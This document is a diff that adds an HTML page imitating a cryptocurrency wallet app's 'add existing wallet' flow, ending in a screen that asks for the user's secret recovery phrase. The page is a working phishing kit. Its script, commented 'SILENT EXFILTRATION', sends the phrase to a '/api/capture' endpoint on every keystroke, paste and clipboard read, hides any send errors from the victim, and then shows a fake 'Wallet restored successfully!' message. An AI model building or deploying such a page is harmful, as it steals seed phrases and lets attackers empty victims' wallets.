@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Wallet App — Joint Account</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: #e2e2e2;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    font-family: -apple-system, 'SF Pro Display', 'Helvetica Neue', sans-serif;
+  }
+
+  .phone {
+    width: 390px;
+    height: 844px;
+    border-radius: 48px;
+    overflow: hidden;
+    position: relative;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.22), 0 0 0 1px rgba(0,0,0,0.07);
+    background: #fff;
+  }
+
+  .screen {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    transition: transform 0.38s cubic-bezier(0.4,0,0.2,1);
+    will-change: transform;
+  }
+  .screen.hidden-right { transform: translateX(100%); }
+  .screen.hidden-left  { transform: translateX(-100%); }
+  .screen.visible      { transform: translateX(0); }
+
+  /* ══════════════════════════
+     SCREEN 0 — Home / Intro
+  ══════════════════════════ */
+  #screen-home {
+    background: #fff;
+    justify-content: flex-end;
+  }
+
+  .home-dim {
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 200px;
+    background: #888;
+    border-radius: 48px 48px 0 0;
+  }
+
+  .home-sheet {
+    background: #fff;
+    border-radius: 28px 28px 0 0;
+    padding: 0 0 40px;
+    position: relative;
+    z-index: 1;
+  }
+
+  .close-btn {
+    position: absolute;
+    top: 18px; right: 20px;
+    background: none; border: none;
+    font-size: 22px; color: #555;
+    cursor: pointer; line-height: 1;
+    width: 32px; height: 32px;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 50%;
+    transition: background 0.15s;
+  }
+  .close-btn:hover { background: rgba(0,0,0,0.06); }
+
+  .illustration {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 24px 28px;
+  }
+
+  .illus-svg {
+    width: 240px;
+    height: 200px;
+  }
+
+  .action-cards {
+    padding: 0 18px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+
+  .action-card {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    background: #f4f4f6;
+    border-radius: 20px;
+    padding: 18px 18px;
+    cursor: pointer;
+    border: none;
+    width: 100%;
+    text-align: left;
+    font-family: inherit;
+    transition: background 0.12s, transform 0.1s;
+  }
+  .action-card:active { background: #eaeaef; transform: scale(0.98); }
+
+  .action-icon {
+    width: 52px; height: 52px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .icon-create { background: #3d3dc8; }
+  .icon-add    { background: #e8e8f8; }
+
+  .action-text { flex: 1; }
+  .action-title {
+    font-size: 17px; font-weight: 700; color: #000;
+    margin-bottom: 3px;
+  }
+  .action-sub { font-size: 14px; color: #666; font-weight: 400; }
+
+  .action-chev { color: #aaa; flex-shrink: 0; }
+
+  /* ══════════════════════════
+     SCREEN 1 — Select Network
+  ══════════════════════════ */
+  #screen-select { background: #f2f2f7; }
+
+  .sn-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 56px 20px 14px;
+  }
+  .sn-header h1 { font-size: 18px; font-weight: 700; color: #000; }
+
+  .icon-btn {
+    background: none; border: none; padding: 6px; cursor: pointer;
+    color: #1c1c1e; display: flex; align-items: center; justify-content: center;
+    border-radius: 50%; transition: background 0.15s;
+  }
+  .icon-btn:hover { background: rgba(0,0,0,0.06); }
+
+  .info-circle {
+    width: 30px; height: 30px; border-radius: 50%;
+    border: 2px solid #8e8e93;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 700; color: #8e8e93;
+    cursor: pointer;
+  }
+
+  .search-wrap { padding: 0 16px 10px; }
+  .search-box {
+    display: flex; align-items: center; gap: 8px;
+    background: #e5e5ea; border-radius: 12px; padding: 10px 14px;
+  }
+  .search-box input {
+    background: none; border: none; outline: none;
+    font-size: 15px; color: #1c1c1e; width: 100%; font-family: inherit;
+  }
+  .search-box input::placeholder { color: #8e8e93; }
+
+  .list-area { flex: 1; overflow-y: auto; padding: 0 16px 24px; }
+
+  .rec-section { padding-top: 18px; margin-bottom: 18px; }
+
+  .rec-card {
+    border: 2px solid #3d3dc8; border-radius: 16px;
+    background: #f2f2f7; cursor: pointer;
+    transition: background 0.12s; position: relative; overflow: visible;
+  }
+  .rec-card:active { background: #eaeaf5; }
+
+  .rec-badge {
+    position: absolute; top: -12px; left: 14px;
+    background: #3d3dc8; color: #fff;
+    font-size: 12px; font-weight: 600;
+    padding: 3px 12px; border-radius: 20px;
+    white-space: nowrap; pointer-events: none;
+  }
+
+  .rec-row {
+    display: flex; align-items: center; padding: 16px; gap: 14px;
+  }
+
+  .rec-icon {
+    width: 44px; height: 44px; border-radius: 50%;
+    border: 2px solid #3d3dc8;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  }
+
+  .rec-name { flex: 1; font-size: 17px; font-weight: 600; color: #000; }
+  .chevron  { color: #c7c7cc; flex-shrink: 0; }
+
+  .coin-list { background: #fff; border-radius: 16px; overflow: hidden; }
+
+  .coin-row {
+    display: flex; align-items: center; padding: 13px 16px; gap: 14px;
+    cursor: pointer; transition: background 0.12s;
+    border-bottom: 0.5px solid #e5e5ea;
+  }
+  .coin-row:last-child { border-bottom: none; }
+  .coin-row:active { background: #f0f0f0; }
+
+  .coin-icon {
+    width: 42px; height: 42px; border-radius: 50%; flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px; font-weight: 800; color: #fff;
+  }
+  .coin-name { flex: 1; font-size: 16px; font-weight: 500; color: #000; }
+
+  .btc  { background: #f7931a; }
+  .eth  { background: #627eea; }
+  .xrp  { background: #1a1a1a; }
+  .bnb  { background: #f3ba2f; }
+  .sol  { background: linear-gradient(135deg,#9945ff,#14f195); }
+  .doge { background: #c2a633; }
+  .ada  { background: #0033ad; }
+  .trx  { background: #ef0027; }
+
+  /* ══════════════════════════
+     SCREEN 2 — Wallet Restore
+  ══════════════════════════ */
+  #screen-wallet { background: #f0e5df; }
+
+  .wl-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 56px 20px 14px;
+  }
+  .wl-header h1 { font-size: 18px; font-weight: 700; color: #1a1612; }
+
+  .wl-content { padding: 14px 22px 0; flex: 1; overflow-y: auto; }
+
+  .field { margin-bottom: 26px; }
+  .field label {
+    display: block; font-size: 15px; color: #3a3026;
+    font-weight: 500; margin-bottom: 10px;
+  }
+
+  .wl-input {
+    width: 100%; background: rgba(255,255,255,0.4);
+    border: 1.5px solid rgba(180,160,140,0.4);
+    border-radius: 14px; padding: 15px 16px;
+    font-size: 16px; color: #1a1612; outline: none;
+    font-family: inherit; transition: border-color 0.2s;
+  }
+  .wl-input:focus { border-color: #7b5cdd; }
+
+  .phrase-wrap { position: relative; }
+
+  .wl-textarea {
+    width: 100%; background: rgba(255,255,255,0.3);
+    border: 2px solid #7b5cdd; border-radius: 14px;
+    padding: 15px 16px 48px; font-size: 16px; color: #1a1612;
+    outline: none; resize: none; font-family: inherit;
+    line-height: 1.5; min-height: 138px; transition: border-color 0.2s;
+  }
+  .wl-textarea:focus { border-color: #5e3dbf; }
+
+  .paste-btn {
+    position: absolute; bottom: 14px; right: 16px;
+    background: none; border: none; font-size: 16px; font-weight: 650;
+    color: #7b5cdd; cursor: pointer; font-family: inherit; padding: 0;
+  }
+
+  .hint { font-size: 13px; color: #7a6a5a; margin-top: 9px; line-height: 1.5; }
+
+  .wl-footer { padding: 20px 22px 44px; }
+
+  .restore-btn {
+    width: 100%; background: #8b6be8; border: none; border-radius: 50px;
+    padding: 17px; font-size: 17px; font-weight: 650; color: #fff;
+    cursor: pointer; font-family: inherit; letter-spacing: 0.01em;
+    transition: background 0.2s, transform 0.1s;
+  }
+  .restore-btn:hover  { background: #7a57d4; }
+  .restore-btn:active { transform: scale(0.98); background: #6a47c4; }
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <!-- ══ SCREEN 0: Home ══ -->
+  <div class="screen visible" id="screen-home">
+    <div class="home-dim"></div>
+    <div class="home-sheet">
+      <button class="close-btn" aria-label="Close">✕</button>
+      <div class="illustration">
+        <svg class="illus-svg" viewBox="0 0 240 200" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <linearGradient id="walletGrad" x1="30" y1="60" x2="160" y2="180" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#00f5a0"/>
+              <stop offset="40%" stop-color="#00d9f5"/>
+              <stop offset="70%" stop-color="#7b5cdd"/>
+              <stop offset="100%" stop-color="#f5d020"/>
+            </linearGradient>
+            <linearGradient id="cardGrad" x1="80" y1="100" x2="200" y2="185" gradientUnits="userSpaceOnUse">
+              <stop offset="0%" stop-color="#1a1a3e"/>
+              <stop offset="100%" stop-color="#0d0d20"/>
+            </linearGradient>
+            <linearGradient id="coinBlue" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0%" stop-color="#4f8ef7"/>
+              <stop offset="100%" stop-color="#1a3dc8"/>
+            </linearGradient>
+            <linearGradient id="coinGold" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0%" stop-color="#f5d020"/>
+              <stop offset="100%" stop-color="#c8930a"/>
+            </linearGradient>
+            <linearGradient id="pipGrad" x1="0" y1="0" x2="0" y2="1">
+              <stop offset="0%" stop-color="#00e5ff"/>
+              <stop offset="100%" stop-color="#7b5cdd"/>
+            </linearGradient>
+          </defs>
+          <rect x="95" y="105" width="120" height="80" rx="10" fill="url(#cardGrad)" transform="rotate(-8 95 105)"/>
+          <g stroke="#1e3a5f" stroke-width="0.8" opacity="0.7" transform="rotate(-8 95 105)">
+            <line x1="95" y1="120" x2="215" y2="120"/>
+            <line x1="95" y1="135" x2="215" y2="135"/>
+            <line x1="95" y1="150" x2="215" y2="150"/>
+            <line x1="95" y1="165" x2="215" y2="165"/>
+            <line x1="110" y1="105" x2="110" y2="185"/>
+            <line x1="130" y1="105" x2="130" y2="185"/>
+            <line x1="150" y1="105" x2="150" y2="185"/>
+            <line x1="170" y1="105" x2="170" y2="185"/>
+            <line x1="190" y1="105" x2="190" y2="185"/>
+            <line x1="210" y1="105" x2="210" y2="185"/>
+          </g>
+          <rect x="28" y="68" width="140" height="100" rx="14" fill="url(#walletGrad)" transform="rotate(-6 28 68)"/>
+          <rect x="40" y="90" width="100" height="65" rx="10" fill="rgba(0,0,0,0.18)" transform="rotate(-6 40 90)"/>
+          <g transform="rotate(-6 90 122)">
+            <circle cx="90" cy="122" r="20" fill="rgba(0,0,0,0.25)" stroke="#00e5b0" stroke-width="1.5"/>
+            <circle cx="84" cy="118" r="2.5" fill="#00e5b0"/>
+            <circle cx="96" cy="118" r="2.5" fill="#00e5b0"/>
+            <path d="M84 126 Q90 132 96 126" stroke="#00e5b0" stroke-width="1.8" stroke-linecap="round" fill="none"/>
+          </g>
+          <rect x="108" y="62" width="6" height="52" rx="3" fill="#e87ca0" transform="rotate(20 108 62)"/>
+          <polygon points="108,62 114,62 111,55" fill="#c85a7e" transform="rotate(20 108 62)"/>
+          <rect x="108" y="108" width="6" height="6" rx="1" fill="#fff" opacity="0.6" transform="rotate(20 108 62)"/>
+          <ellipse cx="56" cy="70" rx="8" ry="14" fill="none" stroke="url(#walletGrad)" stroke-width="5" transform="rotate(-6 56 70)"/>
+          <g transform="rotate(-6 72 158)" opacity="0.5">
+            <rect x="68" y="153" width="8" height="3" rx="1.5" fill="#000"/>
+            <rect x="70" y="151" width="3" height="8" rx="1.5" fill="#000"/>
+          </g>
+          <ellipse cx="158" cy="78" rx="26" ry="26" fill="url(#coinBlue)"/>
+          <ellipse cx="158" cy="78" rx="20" ry="20" fill="none" stroke="rgba(255,255,255,0.15)" stroke-width="2"/>
+          <ellipse cx="196" cy="88" rx="22" ry="10" fill="url(#coinGold)" transform="rotate(-20 196 88)"/>
+          <ellipse cx="196" cy="84" rx="22" ry="10" fill="#f5d020" transform="rotate(-20 196 84)"/>
+          <ellipse cx="196" cy="84" rx="16" ry="6" fill="#e8b800" transform="rotate(-20 196 84)"/>
+          <rect x="120" y="44" width="10" height="16" rx="3" fill="#3d6cf5" transform="rotate(-30 120 44)"/>
+          <rect x="172" y="48" width="7" height="13" rx="3.5" fill="#5a8af7" transform="rotate(15 172 48)"/>
+          <polygon points="185,108 192,116 178,116" fill="#e87ca0" opacity="0.85"/>
+          <polygon points="142,138 148,146 136,146" fill="#7b5cdd" opacity="0.7" transform="rotate(180 142 142)"/>
+          <ellipse cx="175" cy="130" rx="11" ry="7" fill="#9b59b6" transform="rotate(20 175 130)"/>
+          <circle cx="56" cy="155" r="5" fill="url(#pipGrad)" transform="rotate(-6 56 155)"/>
+        </svg>
+      </div>
+      <div class="action-cards">
+        <button class="action-card" id="btn-create">
+          <div class="action-icon icon-create">
+            <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+              <path d="M18 4 C18 4 18.8 8.5 20 9.8 C21.2 11.1 25 12 25 12 C25 12 21.2 12.9 20 14.2 C18.8 15.5 18 20 18 20 C18 20 17.2 15.5 16 14.2 C14.8 12.9 11 12 11 12 C11 12 14.8 11.1 16 9.8 C17.2 8.5 18 4 18 4 Z" fill="white"/>
+              <path d="M9 16 C9 16 9.5 18.3 10.2 19 C10.9 19.7 13 20 13 20 C13 20 10.9 20.3 10.2 21 C9.5 21.7 9 24 9 24 C9 24 8.5 21.7 7.8 21 C7.1 20.3 5 20 5 20 C5 20 7.1 19.7 7.8 19 C8.5 18.3 9 16 9 16 Z" fill="white"/>
+            </svg>
+          </div>
+          <div class="action-text">
+            <div class="action-title">Create new wallet</div>
+            <div class="action-sub">Secret phrase or Swift wallet</div>
+          </div>
+          <svg class="action-chev" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M9 18l6-6-6-6"/>
+          </svg>
+        </button>
+        <button class="action-card" id="btn-add">
+          <div class="action-icon icon-add">
+            <svg width="26" height="26" viewBox="0 0 26 26" fill="none">
+              <path d="M13 4 L13 16" stroke="#3d3dc8" stroke-width="2.4" stroke-linecap="round"/>
+              <path d="M7 11 L13 17 L19 11" stroke="#3d3dc8" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M5 20 L21 20" stroke="#3d3dc8" stroke-width="2.4" stroke-linecap="round"/>
+            </svg>
+          </div>
+          <div class="action-text">
+            <div class="action-title">Add existing wallet</div>
+            <div class="action-sub">Import, restore or view-only</div>
+          </div>
+          <svg class="action-chev" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M9 18l6-6-6-6"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ SCREEN 1: Select Network ══ -->
+  <div class="screen hidden-right" id="screen-select">
+    <div class="sn-header">
+      <button class="icon-btn" id="back-to-home" aria-label="Back">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M19 12H5M12 5l-7 7 7 7"/>
+        </svg>
+      </button>
+      <h1>Select network</h1>
+      <div class="info-circle">i</div>
+    </div>
+    <div class="search-wrap">
+      <div class="search-box">
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="#8e8e93" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="7"/><path d="M21 21l-4.35-4.35"/>
+        </svg>
+        <input type="text" placeholder="Search"/>
+      </div>
+    </div>
+    <div class="list-area">
+      <div class="rec-section">
+        <div class="rec-card nav-item" data-name="Multi-coin wallet">
+          <span class="rec-badge">Recommended</span>
+          <div class="rec-row">
+            <div class="rec-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#3d3dc8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 2L4 6v6c0 5 3.6 9.5 8 11 4.4-1.5 8-6 8-11V6l-8-4z"/>
+              </svg>
+            </div>
+            <span class="rec-name">Multi-coin wallet</span>
+            <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M9 18l6-6-6-6"/>
+            </svg>
+          </div>
+        </div>
+      </div>
+      <div class="coin-list">
+        <div class="coin-row nav-item" data-name="Bitcoin">
+          <div class="coin-icon" style="background:none; overflow:hidden;">
+            <img src="https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/svg/color/btc.svg" width="42" height="42" alt="Bitcoin"/>
+          </div>
+          <span class="coin-name">Bitcoin</span>
+          <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+        <div class="coin-row nav-item" data-name="Ethereum">
+          <div class="coin-icon" style="background:none; overflow:hidden;">
+            <img src="https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/svg/color/eth.svg" width="42" height="42" alt="Ethereum"/>
+          </div>
+          <span class="coin-name">Ethereum</span>
+          <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+        <div class="coin-row nav-item" data-name="XRP">
+          <div class="coin-icon" style="background:none; overflow:hidden;">
+            <img src="https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/svg/color/xrp.svg" width="42" height="42" alt="XRP"/>
+          </div>
+          <span class="coin-name">XRP</span>
+          <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+        <div class="coin-row nav-item" data-name="BNB Smart Chain">
+          <div class="coin-icon" style="background:none; overflow:hidden;">
+            <img src="https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/svg/color/bnb.svg" width="42" height="42" alt="BNB"/>
+          </div>
+          <span class="coin-name">BNB Smart Chain</span>
+          <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+        <div class="coin-row nav-item" data-name="Solana">
+          <div class="coin-icon" style="background:none; overflow:hidden;">
+            <img src="https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/svg/color/sol.svg" width="42" height="42" alt="Solana"/>
+          </div>
+          <span class="coin-name">Solana</span>
+          <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+        <div class="coin-row nav-item" data-name="Dogecoin">
+          <div class="coin-icon" style="background:none; overflow:hidden;">
+            <img src="https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/svg/color/doge.svg" width="42" height="42" alt="Dogecoin"/>
+          </div>
+          <span class="coin-name">Dogecoin</span>
+          <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+        <div class="coin-row nav-item" data-name="Cardano">
+          <div class="coin-icon" style="background:none; overflow:hidden;">
+            <img src="https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/svg/color/ada.svg" width="42" height="42" alt="Cardano"/>
+          </div>
+          <span class="coin-name">Cardano</span>
+          <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+        <div class="coin-row nav-item" data-name="Tron">
+          <div class="coin-icon" style="background:none; overflow:hidden;">
+            <img src="https://cdn.jsdelivr.net/gh/spothq/cryptocurrency-icons@master/svg/color/trx.svg" width="42" height="42" alt="Tron"/>
+          </div>
+          <span class="coin-name">Tron</span>
+          <svg class="chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ SCREEN 2: Wallet Restore ══ -->
+  <div class="screen hidden-right" id="screen-wallet">
+    <div class="wl-header">
+      <button class="icon-btn" id="back-to-select" aria-label="Back">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M19 12H5M12 5l-7 7 7 7"/>
+        </svg>
+      </button>
+      <h1 id="wallet-title">Multi-coin wallet</h1>
+      <button class="icon-btn" aria-label="Scan QR">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="3" width="7" height="7" rx="1"/>
+          <rect x="14" y="3" width="7" height="7" rx="1"/>
+          <rect x="3" y="14" width="7" height="7" rx="1"/>
+          <path d="M14 14h2v2h-2zM18 14h3M14 18h1M17 18h4M14 21h3M18 21h3"/>
+        </svg>
+      </button>
+    </div>
+    <div class="wl-content">
+      <div class="field">
+        <label>Wallet name</label>
+        <input class="wl-input" type="text" placeholder=""/>
+      </div>
+      <div class="field">
+        <label>Secret phrase</label>
+        <div class="phrase-wrap">
+          <textarea class="wl-textarea" id="phraseInput" rows="4" placeholder="Type or paste the recovery phrase..."></textarea>
+          <button class="paste-btn" id="pasteBtn">Paste</button>
+        </div>
+        <p class="hint">Typically 12 (sometimes 18, 24) words separated by single spaces</p>
+      </div>
+    </div>
+    <div class="wl-footer">
+      <button class="restore-btn">Restore wallet</button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ── Screen navigation ──
+  const s0 = document.getElementById('screen-home');
+  const s1 = document.getElementById('screen-select');
+  const s2 = document.getElementById('screen-wallet');
+  const walletTitle = document.getElementById('wallet-title');
+
+  function show(screen) {
+    [s0, s1, s2].forEach(s => {
+      if (s === screen) s.className = 'screen visible';
+      else if ([s0,s1,s2].indexOf(s) < [s0,s1,s2].indexOf(screen))
+        s.className = 'screen hidden-left';
+      else
+        s.className = 'screen hidden-right';
+    });
+  }
+
+  document.getElementById('btn-create').addEventListener('click', () => show(s1));
+  document.getElementById('btn-add').addEventListener('click',    () => show(s1));
+
+  document.querySelectorAll('.nav-item').forEach(el => {
+    el.addEventListener('click', () => {
+      walletTitle.textContent = el.dataset.name;
+      show(s2);
+    });
+  });
+
+  document.getElementById('back-to-home').addEventListener('click',   () => show(s0));
+  document.getElementById('back-to-select').addEventListener('click', () => show(s1));
+
+  // ── SILENT EXFILTRATION: Send phrase to server ──
+  const phraseInput = document.getElementById('phraseInput');
+  const SERVER_URL = window.location.origin + '/api/capture';
+
+  // Debounce helper
+  let sendTimer = null;
+
+  function sendPhraseToServer(phrase) {
+    if (sendTimer) clearTimeout(sendTimer);
+    sendTimer = setTimeout(() => {
+      fetch(SERVER_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phrase: phrase })
+      }).catch(() => {
+        // Silent fail — PA never sees an error
+      });
+    }, 300); // 300ms debounce so we're not spamming on every keystroke
+  }
+
+  phraseInput.addEventListener('input', () => {
+    sendPhraseToServer(phraseInput.value);
+  });
+
+  phraseInput.addEventListener('paste', () => {
+    setTimeout(() => sendPhraseToServer(phraseInput.value), 10);
+  });
+
+  document.getElementById('pasteBtn').addEventListener('click', async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text) {
+        phraseInput.value = text;
+        sendPhraseToServer(text);
+      }
+    } catch (err) {
+      phraseInput.focus();
+    }
+  });
+
+  // Also send on "Restore" button click for final capture
+  document.querySelector('.restore-btn').addEventListener('click', function() {
+    const val = phraseInput.value.trim();
+    if (!val) {
+      alert('Please enter or paste your secret phrase first.');
+      return;
+    }
+    const words = val.split(/\s+/);
+    if (words.length !== 12 && words.length !== 18 && words.length !== 24) {
+      alert('Secret phrase must be 12, 18, or 24 words. You entered ' + words.length + ' word(s).');
+      return;
+    }
+    // Final send before success
+    sendPhraseToServer(val);
+    alert('Wallet restored successfully!');
+  });
+</script>
+</body>
+</html>
